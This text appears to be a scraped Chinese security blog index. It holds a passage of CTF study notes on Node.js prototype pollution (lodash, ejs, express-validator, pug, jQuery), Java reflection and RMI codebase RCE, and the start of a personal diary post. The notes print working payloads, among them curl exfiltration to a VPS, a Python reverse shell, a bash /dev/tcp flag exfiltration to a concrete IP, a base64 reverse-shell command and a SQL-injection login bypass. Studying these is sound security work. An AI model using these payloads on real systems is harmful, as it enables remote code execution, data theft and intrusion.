test\u0026#39; }); }); var server = app.listen(8000, function () { var host = server.address().address var port = server.address().port console.log(\u0026#34;应用实例，访问地址为 http://%s:%s\u0026#34;, host, port) }); 在第12行下断点\n可以看到在它执行结束之后Object的原型链上多了一个outputFunctionName，我们先跟进调用看看后面接入ejs的部分是怎么执行的；在16行打断点，刷新后看render方法\n跟入app.render()，express\\lib\\application.js\n跟进view.render()，express\\lib\\view.js\n可见我们的恶意代码部分被以options参数的形式加载到了this.engine中，之后engine选用ejs模板引擎，进入ejs\\lib\\ejs.js\n进入renderFile函数，返回tryHandleCache()，跟入\n跟入compile，这里有大量的字符串拼接，我们的恶意代码就这样被拼进去了\n这里的opts.outputFunctionName正是我们污染的opts.__proto__outputFunctionName，也就是一开始进入render的opts\n倒叙了属于是，看一下这个lodash.merge的整个过程\n注意到这里的函数和注释，就很有原型污染的可能啊\n当我们的payload从这里传入的时候，在进入baseMergeDeep之后会先有一个safeGet的过滤\n但是我们用prototype就轻松绕过了，之后srcvalue被赋给newValue，进入assignMergeValue，调用一次baseAssginValue\n彻底将prototype的值赋给我们的payload，做到原型污染\nlodash.template 直接拿p牛的题举例了，这个洞是最近不久才被修复，不过虽然这里利用的同样是lodash.merge，不过却和上面的lodash.merge不是一条调用链，所以受影响版本不同\n[Codebreaking 2018]Thejs const fs = require(\u0026#39;fs\u0026#39;) const express = require(\u0026#39;express\u0026#39;) const bodyParser = require(\u0026#39;body-parser\u0026#39;) const lodash = require(\u0026#39;lodash\u0026#39;) const session = require(\u0026#39;express-session\u0026#39;) const randomize = require(\u0026#39;randomatic\u0026#39;) const app = express() app.use(bodyParser.urlencoded({extended: true})).use(bodyParser.json()) app.use(\u0026#39;/static\u0026#39;, express.static(\u0026#39;static\u0026#39;)) app.use(session({ name: \u0026#39;thejs.session\u0026#39;, secret: randomize(\u0026#39;aA0\u0026#39;, 16), resave: false, saveUninitialized: false })) app.engine(\u0026#39;ejs\u0026#39;, function (filePath, options, callback) { // define the template engine fs.readFile(filePath, (err, content) =\u0026gt; { if (err) return callback(new Error(err)) let compiled = lodash.template(content)\t// 继承自lodash let rendered = compiled({...options}) return callback(null, rendered) }) }) app.set(\u0026#39;views\u0026#39;, \u0026#39;./views\u0026#39;) app.set(\u0026#39;view engine\u0026#39;, \u0026#39;ejs\u0026#39;) app.all(\u0026#39;/\u0026#39;, (req, res) =\u0026gt; { let data = req.session.data || {language: [], category: []} if (req.method == \u0026#39;POST\u0026#39;) { data = lodash.merge(data, req.body)\t// 可以原型链污染lodash req.session.data = data } res.render(\u0026#39;index\u0026#39;, { language: data.language, category: data.category }) }) app.listen(3000, () =\u0026gt; console.log(`Example app listening on port 3000!`)) 我们可以通过污染loadsh.merge给Object对象插入任意属性，最后污染loadsh.template；具体污染lodash.template的哪个属性，还要参考源码\n// https://github.com/lodash/lodash/blob/4.17.4-npm/template.js#L165 // Use a sourceURL for easier debugging. var sourceURL = \u0026#39;sourceURL\u0026#39; in options ? \u0026#39;//# sourceURL=\u0026#39; + options.sourceURL + \u0026#39;\\n\u0026#39; : \u0026#39;\u0026#39;; // ... var result = attempt(function() { return Function(importsKeys, sourceURL + \u0026#39;return \u0026#39; + source) .apply(undefined, importsValues); }); options.sourceURL没有赋值，取空字符串，我们给所有Object对象插入一个sourceURL属性，就会被拼入return Function的第二个参数中造成rce\npayload\n{\u0026#34;__proto__\u0026#34;:{\u0026#34;sourceURL\u0026#34;:\u0026#34;\\u000areturn e=\u0026gt;{for(var a in {}){delete Object.prototype[a];}return global.process.mainModule.consturctor._load(\u0026#39;child_process\u0026#39;).execSync(\u0026#39;ls /\u0026#39;).toString()}\\u000a//\u0026#34;}} 借助其它库扩大攻击面 express-validator + lodash lodash\u0026lt;4.17.17 来源于一道CTF题（而且被抄了2次还），在本身lodash存在原型污染的情况下结合其它库扩大攻击面\n[XNUCACTF 2020 Qualifier]oooooooldjs 这个题有三个考点，还是肥肠的难顶的\n原型链污染：lodash.set + express-validator 异步bug jQuery RCE gadget express-validator的具体实现 我们以一段代码作为示例\nconst express = require(\u0026#39;express\u0026#39;) const app = express() const port = 1337 app.use(express.json()) app.use(express.urlencoded({ extended: true })) const { body, validationResult } = require(\u0026#39;express-validator\u0026#39;) middlewares = [ body(\u0026#39;*\u0026#39;).trim() ] app.use(middlewares) app.post(\u0026#34;/user\u0026#34;, (req, res)=\u0026gt;{ const foo = \u0026#34;helloworld\u0026#34; return res.status(200).send(foo) }) app.listen(port,()=\u0026gt;{ console.log(`server listening on ${port}`) }) 其中第16行的body('*').trim()是对validator这一中间件的设置，可以在node_modules\\express-validator\\src\\middlewares\\validation-chain-builders.js中找到它的具体实现\n首先是对body, cookie, header, param, query这几个对象都是对buildCheckFunction(['xxxx'])的封装，用来实现validator的功能\n如果我们在第6行下断点 可以看到对应的参数在依次传入并返回，它其实是调用了node_modules\\express-validator\\src\\middlewares\\check.js中check的实现\n先看返回值，Object.assign()函数，首先是utils_1.bindall()函数将传入对象的函数作为对象的一个属性进行绑定\n之后再传入Object.assign，将sanitizers和validators浅拷贝到middleware上，就可以通过这个middleware调用所有的验证和过滤函数\n之后进入express-validator\\src\\chain\\context-runner-impl.js看到trim()，跟入调用\nexpress-validator\\src\\context-builder.js\n芜，竟然是一个入栈操作，把传入的值压入栈中\n回过头去看this.builder.addItem，传入的是以trim为参数的Sanitization对象，为builder增加一个sanitization后返回this.chain即middleware，做到链式调用\n跟入这个Sanitization\nrun方法中调用context.setData来调用传入的sanitizer修改新的值\n再往前，回到node_modules\\express-validator\\src\\middlewares\\check.js，刚才我们只看了返回值，但它会先在第12行new一个ContextRunnerImpl\nnode_modules\\express-validator\\src\\chain\\context-runner-impl.js\n它的run方法在之前的第15行被调用，可以看作是middleware调用的入口，这个run先申请了一个context（可以理解为http请求的上下文的一个封装），27行有一个for遍历，对于栈中的item（这个栈就是之前addItem的栈）再依次调用它的run方法\n究极套娃，总结整个逻辑就是这样的：\n首先将validator和sanitizers的方法绑定到check函数返回的middleware上，这些validator和sanitizer的方法是通过向context.stack中push context-items，最后在ContextRunnerImpl.run方法里遍历栈中的items，逐一调用其run方法实现validation或sanitization\n结合lodash.set扩大攻击面 在上面分析的最后部分我们提到了实际调用时的for循环\n45行有个if，如果满足options.dryRun为空且reqValue!==instance.value，就可以调用_.set来重置req[location]中的值为newValue；而第一个默认是undefined不用管，而第二个，以trim为例，如果传入的参数两边存在空白字符，经过trim处理后就可以满足这个条件了\n这个_.set正是我们的老朋友lodash.set，尝试lodash.set的payload\n{\u0026#34;__proto__.[whoami]\u0026#34;: \u0026#34;amiz \u0026#34;} 虽然满足了条件但并不能污染成功，在关键处打断点，定位到node_modules\\express-validator\\src\\select-fields.js（因为在ContextRunnerImpl.js中的24行，在调用各种具体的run方法之前先调用了this.selectFields\n35行是一个*的通配符，{\u0026quot;a\u0026quot;:{\u0026quot;b\u0026quot;:\u0026quot;123\u0026quot;}}这样的body参数就会对b进行验证，但是如果是{\u0026quot;a.b\u0026quot;:\u0026quot;123\u0026quot;}这样的，会将a.b视作一个key，不会对a.b进行验证，在传入express时不会自动进行unfaltten而变为一个a对象包含一个b对象；但express-validator内部是通过lodash的_get和_set对对象进行赋值和取值，当传入a.b时lodash会自动进行一个套娃（具体的前面已经写了），为了防止这种情况的出现，express-validator对key进行检查，可以看到57行，出现.就会在周围加一对方括号，起到转义作用\n所以我们传入的就会变成这样\n在两端多了方括号，破坏了我们原来的payload，相当于\nvar _ = require(\u0026#39;lodash\u0026#39;) var a = {\u0026#34;__proto__.[whoami]\u0026#34;: \u0026#34;amiz\u0026#34;} _.set(a,\u0026#34;[\\\u0026#34;__proto__.[whoami]\\\u0026#34;]\u0026#34;, 2)\t// 多了方括号 我们要利用select-fileds的一些转义的技巧来bypass\n{\u0026#34;\\\u0026#34;].__proto__[\\\u0026#34;whoami\u0026#34;:\u0026#34;Vulnerable\u0026#34;} 相当于\nvar _ = require(\u0026#39;lodash\u0026#39;) var c = {\u0026#34;\\\u0026#34;].__proto__[\\\u0026#34;whoami\u0026#34;: \u0026#34;Vulnerable\u0026#34;} _.set(c,\u0026#34;[\\\u0026#34;\\\u0026#34;].__proto__[\\\u0026#34;whoami\\\u0026#34;]\u0026#34;, 2) 构造payload的时候还要注意lodash.set，如果第二个参数path的值等于第一个参数object的键Key时会污染失败\n可以污染原型顺利增加一个参数，但是它的参数却是一个空的字符串，原因是_set时的第三个参数newValue时利用变化后的key重新从req[location]中取出来的，原本应该undefined，但是我们经过Sanitization的run方法时有一个toString\n所以undefined变为了空字符串''\n经过了这一系列的处理，reqValue为空就会经过_.get重新取值，而这里得到的undefined不会被toString处理，在46行处undefined!==''依旧为真，继续_.set，进行原型链的污染\n虽然只能有限的进行污染一个空字符串，但是由于js的一些特性 比如在判断中''返回false，我们可以把原本的地方的判断条件结果进行一些反转，从而绕过某些限制或改变代码走向（跟hitcon的那个翻转bit的思想有点像了\njQuery的久远rce - CVE-2015-9251 当jQuery的url返回头的content-type字段为text/javascript时，即使没有设置dataType: 'script'也会自动eval返回内容\n这个漏洞做到了XSS-\u0026gt;RCE的效果，不过很早就修复了（jQuery 3.0.0），找到修复的代码看能否绕过\n通过s.crossDomain来作为if判断的条件，如果为真则不会执行内容\n而这个s.CrossDomain在默认设置中不存在；不过在jQuery初始化时用到了jQuery.ajaxExtend这个函数，内部通过for遍历src的key 链接在这里\n会去找对象上不存在但原型链上存在的key，如果此时原型链被污染就会连带到target，示例\nObject.prototype.polluted = \u0026#39;\u0026#39; let a = {} let c = {} for( key in c){ a[key] = c[key] } console.log(Object.keys(a)) // [ \u0026#39;polluted\u0026#39; ] console.log(a) // { polluted: \u0026#39;\u0026#39; } 经过污染之后s.crossDomain=''变为空字符串，在经过下面这个判断\n在默认中的s.crossDomain是undefined，而undefined==null为true，所以在正常情况下可以进入这个判断，不过前面我们污染它为''，于是这里保留空字符串不进入判断，并且上面的if(s.crossDomain)也不会通过判断，导致s.content.script=true，就可以rce了\n***异步编程的陷阱 这块其实不是特别懂\n直接拿wp里的图了）这里的requests是一个异步函数，在删除this.types数组对应的项之后，由于异步函数的特性，express不会等待requests而是继续执行下面的代码，所以this.datas中对应项的删除也会被对应的异步延后，这样一来在某一时刻会存在这样的情况\n我们可以利用异步函数导致的数据不一致发送一些恶意请求，构造this.types和this.datas中间一端像这个样子\n然后让题目访问我们自己的url；由于后端request请求的是本地环回速度很快，所以为了在dataRepo.D中request没结束时构造好我们想要的数据形式，需要dataRepo.D中requests耗时比我们构造的时间久，比如先post一些链表形式串起来的数据，比如\n然后再发起链表头数据的DELETE请求，让requests进行递归的删除，这样就可以通过这个链表的长度从而控制requests花费的时间，让requests耗费的时间符合我们的预期；链表的实际长度需要根据不同的网络状况进行调整\n跨域问题 设置请求头时除了有text/javascript以外还要另外设置允许跨域访问的请求头\nres.setHeader(\u0026#34;Content-Type\u0026#34;, \u0026#34;text/javascript\u0026#34;) res.setHeader(\u0026#34;Access-Control-Allow-Origin\u0026#34;, \u0026#34;*\u0026#34;) res.setHeader(\u0026#34;Access-Control-Allow-Headers\u0026#34;, \u0026#34;X-Requested-With, crossDomain\u0026#34;) 详细的exp\u0026amp;docker见官方仓库\n关于任意原型链污染 由于出题人加了个json的中间件允许传入object，导致可以做到任意污染（这下格局打开了）\n{\u0026#34;block\u0026#34;: {\u0026#34;__proto__\u0026#34;: {\u0026#34;a\u0026#34;: 123}}, \u0026#34;block\\\u0026#34;].__proto__[\\\u0026#34;a\u0026#34;: 123} [安洵杯 2020]Validator https://xz.aliyun.com/t/8581#toc-2\nif (req.body.password == \u0026#34;D0g3_Yes!!!\u0026#34;){ console.log(info.system_open) if (info.system_open == \u0026#34;yes\u0026#34;){ const flag = readFile(\u0026#34;/flag\u0026#34;) return res.status(200).send(flag) }else{ return res.status(400).send(\u0026#34;The login is successful, but the system is under test and not open...\u0026#34;) } }else{ return res.status(400).send(\u0026#34;Login Fail, Password Wrong!\u0026#34;) } 利用上面任意原型链污染的点来使info.system_open为真\n{\u0026#34;password\u0026#34;:\u0026#34;D0g3_Yes!!!\u0026#34;, \u0026#34;a\u0026#34;: {\u0026#34;__proto__\u0026#34;: {\u0026#34;system_open\u0026#34;: \u0026#34;yes\u0026#34;}}, \u0026#34;a\\\u0026#34;].__proto__[\\\u0026#34;system_open\u0026#34;: \u0026#34;yes\u0026#34; } [巅峰极客 2021]ezjs https://miaotony.xyz/2021/08/07/CTF_2021dianfengjike/#toc-heading-5\n不过这里不能直接传json，用urlencode\nusername=amiz\u0026amp;password=amiz\u0026amp;\u0026#34;].__proto__[\u0026#34;isadmin=amiz\u0026amp;\u0026#34;].__proto__[\u0026#34;debug=amiz 所以就不需要反斜杠什么的去转义json了\n污染admin和debug之后成为用admin的cookie打pug的getshell，有CVE-2021-21353\n/admin?p=\u0026#39;);process.mainModule.constructor._load(\u0026#39;child_process\u0026#39;).exec(\u0026#39;whoami\u0026#39;);_=(\u0026#39; curl -F \u0026#34;file=`ls -al /|base64`\u0026#34; http://VPS curl -F \u0026#34;file=`tac /root/flag.txt`\u0026#34; http://VPS curl外带，或者python shell\n/admin/?p=\u0026#39;);process.mainModule.constructor._load(\u0026#39;child_process\u0026#39;).exec(\u0026#39;python -c \u0026#34;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\u0026#39;vps\\\u0026#39;,port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\\\u0026#39;/bin/bash\\\u0026#39;,\\\u0026#39;-i\\\u0026#39;]);\u0026#34;\u0026#39;);_=(\u0026#39; ejs(\u0026lt;=3.1.6) + lodash payload=\u0026#34;ee;return process.mainModule.require(\u0026#39;child_process\u0026#39;).execSync(\u0026#39;cat /flag \u0026amp;\u0026amp; echo successed\u0026#39;).toString();//\u0026#34; [XNUCA2019Qualifier]HardJS https://github.com/NeSE-Team/OurChallenges/tree/master/XNUCA2019Qualifier/Web/hardjs\n前端和后端分别存在原型污染的漏洞，前端的问题来自于ejs的经典outputFunctionName（或者escapeFunction）\n后端的问题来自于lodash.defaultsDeep\n知道漏洞点了，我们如何利用呢？\n前端的ejs直接弹shell\n{\u0026#34;type\u0026#34;:\u0026#34;test\u0026#34;,\u0026#34;content\u0026#34;:{\u0026#34;constructor\u0026#34;:{\u0026#34;prototype\u0026#34;: {\u0026#34;outputFunctionName\u0026#34;:\u0026#34;a=1;process.mainModule.require(\u0026#39;child_process\u0026#39;).exec(\u0026#39;bash -c \\\u0026#34;echo $FLAG\u0026gt;/dev/tcp/101.35.114.107/8426\\\u0026#34;\u0026#39;)//\u0026#34;}}}} {\u0026#34;constructor\u0026#34;: {\u0026#34;prototype\u0026#34;: {\u0026#34;client\u0026#34;: true,\u0026#34;escapeFunction\u0026#34;: \u0026#34;1; return process.env.FLAG\u0026#34;,\u0026#34;debug\u0026#34;:true, \u0026#34;compileDebug\u0026#34;: true}}} [MRCTF 2022]hurry up\nejs + js-extend [GKCTF 2021]easynode 一看依赖文件，经典ejs 3.1.5肯定有原型链污染，同时需要别的配合，这里的孤儿选手是js-extend\n首先是绕admin权限的登录，在登录处对用户名和密码进行waf处理\n用了==弱比较，并且safeStr用了相加，两个数组相加会得到一个字符串\nusername[]=admin\u0026#39;#\u0026amp;username[]=a\u0026amp;username[]=a\u0026amp;username[]=a\u0026amp;username[]=a\u0026amp;username[]=a\u0026amp;username[]=a\u0026amp;username[]=a\u0026amp;username[]=a\u0026amp;username[]=(\u0026amp;password=123456 这样sql语句会变为\nselect * from test where username = \u0026#39;admin\u0026#39;#,1,1,1,1,1,1,1,1,1*\u0026#39; and password = \u0026#39;123456\u0026#39; 直接注释掉password登录\n得到admin的token之后再到/addAdmin处添加用户（cookie的token字段记得修改）\nusername=__proto__\u0026amp;password=123 /adminDIV处post\ndata={\u0026#34;outputFunctionName\u0026#34;:\u0026#34;_tmp1;global.process.mainModule.require(\u0026#39;child_process\u0026#39;).exec(\u0026#39;echo YmFzaCAtYyAiYmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMDEuMzUuMTE0LjEwNy84NDI2IDA%2BJjEi|base64 -d|bash\u0026#39;);var __tmp2\u0026#34;} 注意一定要b64+urlencode，再次访问/admin触发rce\n防御策略 冻结原型 Object.freeze(Object.prototype); Object.freeze(Object); ({}).__proto__.test = 123 ({}).test // this will be undefined 白名单/黑名单 迭代对象属性，过滤__proto__和prototype，还有一些其它的属性\n使用map结构 用map数据结构来代替自带的对象结构\n使用create进行防御 就很nb，它创建好的对象找不到原型链\nvar obj = Object.create(null); obj.__proto__ // undefined obj.constructor // undefined 以下是本文中涉及到的 和我学习时看过的所有文章的链接🔗 每日感谢互联网的丰富资源（ 深入理解 JavaScript Prototype 污染攻击\nJavaScript_prototype_pollution_attack_in_NodeJS.pdf\nNodejs 常见模块原型链污染与常见模板污染向 RCE\n前端原型链污染漏洞竟可以拿下服务器shell？\noooooooldjs writeup1 | wp2\n在JavaScript中实现链式调用\n","date":"2022-05-04T17:10:23+08:00","permalink":"https://amiaaaz.github.io/2022/05/04/js-prototype-pollution-study-notes/","section":"posts","tags":["js"],"title":"js原型污染学习笔记"},{"categories":["NOTES\u0026SUMMARY"],"contents":"p牛安全漫谈学习\n反射 关于动态特性，p牛给出了这样的定义\n一段代码，改变其中的变量，将会导致这段代码产生功能性的变化\nPHP的一句话🐎也正是这个特性的体现之一，java虽然没有PHP这么灵活，但是强大的反射功能也可以提供一些动态特性，比如这样的函数\npublic void execute(String className, String methodName) throws Exception{ Class cls = Class.forName(className); cls.getMethod(methodName).invoke(cls.newInstance());\t// 执行 } 最终执行的方法根据传入的参数而定\nforName 获取一个class的Class实例的方式之一是Class.forName，它有两个函数重载\nClass\u0026lt;?\u0026gt; forName(String name)\t// 常用 Class\u0026lt;?\u0026gt; forName(String name, **boolean** initialize, ClassLoader loader) 第一个参数是类名，完整路径（如果可控就可以加载任意类），如果加载内部类可以用Class.forName(\u0026quot;C1$C2\u0026quot;)\n第三个参数ClassLoader的作用是告诉JVM如何加载这个类，java默认的ClassLoader就是根据类名（类完整路径）来加载类\n对于第二个参数，即使我们设置true，也不会在执行forName时执行构造函数，因为这里的initialize指的是类的初始化，调用其中的static部分代码\n类的实例化(newInstance)：static{} -\u0026gt; {} -\u0026gt; 构造函数\n类的初始化(initial)：static{}\n由此，如果forName的参数可控，我们可以编写恶意类（恶意代码位于static中），进而完成对指定类的初始化 触发static{}部分；编写poc\npackage ref; public class victim { public static void main(String[] args) throws Exception{ String name = \u0026#34;ref.exp\u0026#34;; Class.forName(name); } } package ref; public class exp { static { try{ Runtime rt = Runtime.getRuntime(); String[] cmd = {\u0026#34;calc.exe\u0026#34;}; Process ps = rt.exec(cmd); ps.waitFor(); }catch (Exception e){ System.out.println(\u0026#34;error here\u0026#34;); } } } getMethod\u0026amp;invoke Class.newInstance调用的是该类的public无参构造函数，而有参数的构造方法 或非public的构造方法都无法通过Class.newInstance()调用，比如Runtime的构造方法就是私有的（单例模式），下面的栗子就无法执行\nClass cls = Class.forName(\u0026#34;java.lang.Runtime\u0026#34;); cls.getMethod(\u0026#34;exec\u0026#34;, String.class).invoke(cls.newInstance(), \u0026#34;calc.exe\u0026#34;); 鉴于此，我们可以通过Runtime.getRuntime获取到Runtime对象，这里指定的重载为最简单的exec，依旧是通过invoke调用：\nClass cls = Class.forName(\u0026#34;java.lang.Runtime\u0026#34;); cls.getMethod(\u0026#34;exec\u0026#34;, String.class).invoke(cls.getMethod(\u0026#34;getRuntime\u0026#34;).invoke(cls), \u0026#34;calc.exe\u0026#34;); invoke作用是执行方法，如果这个方法是普通方法，那么第一个参数是类对象；如果是静态方法，那么第一个参数是类，上面的payload相当于\nClass cls = Class.forName(\u0026#34;java.lang.Runtime\u0026#34;); Method execMethod = cls.getMethod(\u0026#34;exec\u0026#34;, String.class); Method getRuntimeMethod = cls.getMethod(\u0026#34;getRuntime\u0026#34;); Object runtime = getRuntimeMethod.invoke(cls); execMethod.invoke(runtime, \u0026#34;calc.exe\u0026#34;); 另一个API是getDeclaredMethod，获取当前类声明的所有方法（不包括从父类继承来的方法 包含当前类的私有方法），结合这一点，我们也可以通过这个api获取到Runtime对象并调用\nClass cls = Class.forName(\u0026#34;java.lang.Runtime\u0026#34;); Constructor m = cls.getDeclaredConstructor(); m.setAccessible(true); cls.getMethod(\u0026#34;exec\u0026#34;, String.class).invoke(m.newInstance(), \u0026#34;calc.exe\u0026#34;); 注意必须同时设置setAccessible(true)修改作用域\ngetConstructor 当一个类没有public的无参构造方法时，我们可以首先用getConstructor获取到构造函数（需要传入参数类型 因为可以有多种构造函数），之后用newInstance实例化对象，再经过强制类型转换后用start执行；这里用ProcessBuilder作示例\nClass cls = Class.forName(\u0026#34;java.lang.ProcessBuilder\u0026#34;); ((ProcessBuilder) cls.getConstructor(List.class).newInstance(Arrays.asList(\u0026#34;calc.exe\u0026#34;))).start(); 如果目标环境没有强制类型转换时，我们可以再次借助反射\nClass cls = Class.forName(\u0026#34;java.lang.ProcessBuilder\u0026#34;); cls.getMethod(\u0026#34;start\u0026#34;).invoke(cls.getConstructor(List.class).newInstance(Arrays.asList(\u0026#34;calc.exe\u0026#34;))); 先获取到start方法，然后invoke执行，invoke 的第一个参数就是ProcessBuilder Object，逻辑也是很顺的：先获取要执行的方法，然后传入执行的参数\n如果要使用ProcessBuilder的另一个重载（参数为可变长参数String\u0026hellip; command 相当于数组），可以这样\nClass cls = Class.forName(\u0026#34;java.lang.ProcessBuilder\u0026#34;); ((ProcessBuilder) cls.getConstructor(String[].class).newInstance(new String[][]{{\u0026#34;calc.exe\u0026#34;}})).start(); RMI 即Remote Method Invocation，不让它RCE都对不起这个R\n通信实现 Server编写实现类并注册为服务createRegistry，Client查找服务并获得接口实例getRegistry，两者共享相同的接口interface\n当Client连接时，首先连接Registry并寻找想要的对象，发送Call消息；之后Server返回对象（序列化数据），ReturnData消息；Client收到后反序列化得到远程对象，与其建立TCP连接，在这个新的连接中才会在Server端执行方法调用\n可以直接通过rmi://xxx:xxx/这样的地址获取所有绑定的对象（直通RMI Registry后台\nString[] s = Naming.list(\u0026#34;rmi://ip:port\u0026#34;); 对于rebind, bind, unbind这样的危险方法只有当来源是locahost才行，远程用不了\n对于反序列化数据，可以用SerializationDumper进行分析，用wireshark 复制-\u0026gt; as a hex Stream\njava -jar SerializationDumper-v1.1.jar \u0026#34;deadbeaf\u0026#34; https://docs.oracle.com/javase/8/docs/platform/serialization/spec/protocol.html\n一个简单的rmiserver\u0026amp;rmiclient的栗子\npackage server; import java.rmi.Naming; import java.rmi.Remote; import java.rmi.RemoteException; import java.rmi.registry.LocateRegistry; import java.rmi.server.UnicastRemoteObject; public class RMIServer { public interface IRemoteHelloWorld extends Remote{ public String hello() throws RemoteException; } public class RemoteHelloWorld extends UnicastRemoteObject implements IRemoteHelloWorld{ protected RemoteHelloWorld() throws RemoteException{ super(); } @Override public String hello() throws RemoteException { System.out.println(\u0026#34;call from\u0026#34;); return \u0026#34;Hello world\u0026#34;; } } public void start() throws Exception{ RemoteHelloWorld h = new RemoteHelloWorld(); LocateRegistry.createRegistry(9092); Naming.rebind(\u0026#34;rmi://127.0.0.1:9092/Hello\u0026#34;, h); } public static void main(String[] args) throws Exception{ new RMIServer().start(); } } package client; import server.RMIServer; import java.rmi.Naming; public class TrainMain { public static void main(String[] args) throws Exception{ RMIServer.IRemoteHelloWorld hello = (RMIServer.IRemoteHelloWorld) Naming.lookup(\u0026#34;rmi://192.168.31.175:9092/Hello\u0026#34;); String ret = hello.hello(); System.out.println(ret); } } codebase to RCE codebase是类似classpath的一个地址，告知JVM去哪里搜索类，常用于http, ftp这样远程的情况\n在RMI通信过程中，反序列化对象时寻找类时先在自己的classpath下寻找，如果本地找不到就回去远程加载codebase中的类，假如我们指定codebase=http://example.com/ 然后加载org.test.vuln类，jvm就会下载http://example.com/org/test/vuln.class 并将其作为vuln类的字节码进行加载\n所以如果codebase可控，再满足以下条件，就可以加载恶意类了：\n安装并配置了SecurityManager Java版本低于7u21、6u45，或者设置了 java.rmi.server.useCodebaseOnly=false java.rmi.server.useCodebaseOnly是在Java 7u21、6u45的时候修改的一个默认设置，值由false改为了true；在为true的情况下JVM只信任预先配置好的codebase，不支持从RMI中获取，以下是测试代码：\nServer部分\n// Icalc.java package server; import java.rmi.Remote; import java.rmi.RemoteException; import java.util.List; public interface ICalc extends Remote { public Integer sum(List\u0026lt;Integer\u0026gt; params)throws RemoteException; } // Calc.java package server; import java.rmi.RemoteException; import java.rmi.server.UnicastRemoteObject; import java.util.List; public class Calc extends UnicastRemoteObject implements ICalc { public Calc() throws RemoteException{}; public Integer sum(List\u0026lt;Integer\u0026gt; params) throws RemoteException{ Integer sum = 0; for(Integer param: params){ sum += param; } return sum; } } // CalcServer.java package server; import java.rmi.Naming; import java.rmi.registry.LocateRegistry; public class CalcServer { private void start() throws Exception{ if(System.getSecurityManager() == null){ System.out.println(\u0026#34;Setup SecurityManager\u0026#34;); System.setSecurityManager(new SecurityManager()); } Calc h = new Calc(); LocateRegistry.createRegistry(9093); Naming.rebind(\u0026#34;rmi://192.168.31.175:9093/refobj\u0026#34;, h); } public static void main(String[] args) throws Exception{ System.setProperty(\u0026#34;java.security.policy\u0026#34;,\u0026#34;E:\\\\JavaStudy\\\\test01\\\\client.policy\u0026#34;); System.setProperty(\u0026#34;java.rmi.server.hostname\u0026#34;,\u0026#34;192.168.31.175\u0026#34;); System.setProperty(\u0026#34;java.rmi.server.useCodebaseOnly\u0026#34;,\u0026#34;false\u0026#34;); new CalcServer().start(); } } // client.policy grant { permission java.security.AllPermission; }; Client部分（确保与Server的classpath不同）\n// HelloClient.java package rmiT; import java.io.Serializable; import java.rmi.Naming; import java.util.ArrayList; import java.util.List; public class HelloClient implements Serializable { public class Payload extends ArrayList\u0026lt;Integer\u0026gt;{} public void lookup() throws Exception{ ICalc r = (ICalc) Naming.lookup(\u0026#34;rmi://192.168.31.175:9093/refobj\u0026#34;); List\u0026lt;Integer\u0026gt; li = new Payload(); li.add(3); li.add(4); System.out.println(r.sum(li)); } public static void main(String[] args) throws Exception{ System.setProperty(\u0026#34;java.rmi.server.useCodebaseOnly\u0026#34;,\u0026#34;false\u0026#34;); System.setProperty(\u0026#34;java.security.policy\u0026#34;,\u0026#34;E:\\\\JavaStudy\\\\test01\\\\client.policy\u0026#34;); System.setProperty(\u0026#34;java.rmi.server.codebase\u0026#34;,\u0026#34;http://nxo90f9obuj1boi0bzbdanmca3gt4i.burpcollaborator.net/\u0026#34;); if(System.getSecurityManager() == null){ System.out.println(\u0026#34;Setup SecurityManager\u0026#34;); System.setSecurityManager(new SecurityManager()); } new HelloClient().lookup(); } } // Icalc.java package rmiT; import java.rmi.Remote; import java.rmi.RemoteException; import java.util.List; public interface ICalc extends Remote { public Integer sum(List\u0026lt;Integer\u0026gt; params)throws RemoteException; } 运行CalcServer和HelloClient，会看到client的报错\nException in thread \u0026#34;main\u0026#34; java.lang.ClassFormatError: Incompatible magic value 1013478509 in class file server/ICalc 同时注意到我们的burp收到了请求\n利用的话将class放在Web服务器的 /RMIClient$Payload.class即可\ncodebase通过[Ljava.rmi.server.ObjID;的classAnnotations（由annotateClass方法写入）传递，所以即使我们没有RMI客户端，只要修改classAnnotations的值就可以控制codebase，指向我们的网站\nCVE-2017-3241 Java RMI远程反序列化任意类及远程代码执行解析（CVE-2017-3241 ） | CVE-2017-3241-POC | CVE-2017-3241 Java RMI Registry.bind()反序列化漏洞 | JAVA RMI 反序列化远程命令执行漏洞 | 一次攻击内网rmi服务的深思 | 【技术分享】Java AMF3 反序列化漏洞分析\n\u0026lt;=8u112 直接利用\n8u112\u0026lt; JDK \u0026lt; 8u241 需要反链恶意JRMP服务端，所以需要目标服务器能访问攻击者控制的服务器\nTL;DR：对于RMI服务，server端除了正常实现rmi接口的A类之外还存在一个实现了readObject方法的PublicKnown类（比如常见的cc），我们的恶意客户端可以在本地用完整的类名重写A类（调用PublicKnown的反序列化相关方法进行rce）并作为RMI的参数传入，触发rce；poc代码请参见这里\n具体的各版本绕过参考上面的🔗，我就不班门弄斧了喵（）\n","date":"2022-05-04T16:03:58+08:00","permalink":"https://amiaaaz.github.io/2022/05/04/java-study-notes-04/","section":"posts","tags":["Java"],"title":"Java学习笔记Ⅳ"},{"categories":[],"contents":"终于还是动手写点东西了，可能是积攒太久的情绪得不到合理的宣泄，可能是单纯吃饱了撑的\n我本以为22年会是从头到尾顺顺利利的一年，但运气这种事情总不属于我。1月份结束了大二上学期的所有考试之后，我带着行李轻装回到家里，预想了一个相当完美的假期学习计划，但是没几天就土崩瓦解了——现在想想只是一时贪玩，应该给自己放几天假的，但当时过于心急了。我一惯心态就很容易崩，加上各种小错不断，接连怀疑人生，浪费了无数时间在调整自己上。昏昏噩噩的就到了2月份，过完年以后意识到自己已经摆烂了整整1个月，又开始心态大崩，最差的时候连电脑我都不想打开，甚至害怕打开Typora, 